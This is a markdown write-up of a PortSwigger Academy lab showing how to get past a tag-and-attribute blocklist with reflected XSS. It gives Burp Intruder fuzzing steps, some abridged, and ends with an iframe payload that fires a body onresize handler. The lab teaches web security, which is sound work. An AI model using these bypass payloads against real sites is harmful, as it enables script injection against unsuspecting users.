# Lab: Reflected XSS into HTML context with most tags and attributes blocked

**Official lab:** [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)

## Lab idea

A reflected search value is filtered by a web application firewall that blocks many tags and attributes. The challenge practices assessing filter-based defenses and the risk of relying on a WAF or blacklist as the primary XSS control.

## Vulnerability in brief
Cross-site scripting (XSS) is a web security vulnerability in which an application causes attacker-controlled content to be interpreted as executable script in a user’s browser. The code runs in the vulnerable site’s origin, so it can interfere with the victim’s interaction with that application and may access data or perform actions available to that user.

## Solution idea
1. Inject a standard XSS vector, such as: <img src=1 onerror=print()>
2. Observe that this gets blocked.
3. Open Burp's browser and use the search function in the lab.
4. In Burp Intruder, replace the value of the search term with: <>
- …
6. In the Payloads side panel, under Payload configuration , click Clear to remove the previous payloads.
7. Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID: <iframe…
8. Click Store and Deliver exploit to victim .

## Payloads / key values
- `<img src=1 onerror=print()>`
- `<>`
- `<§§>`
- `400`
- `body`
- `200`
- `<body%20=1>`
- `=`
- `<body%20§§=1>`
- `onresize`
- `YOUR-LAB-ID`
- `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`

## Official source
- [PortSwigger Academy: Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)
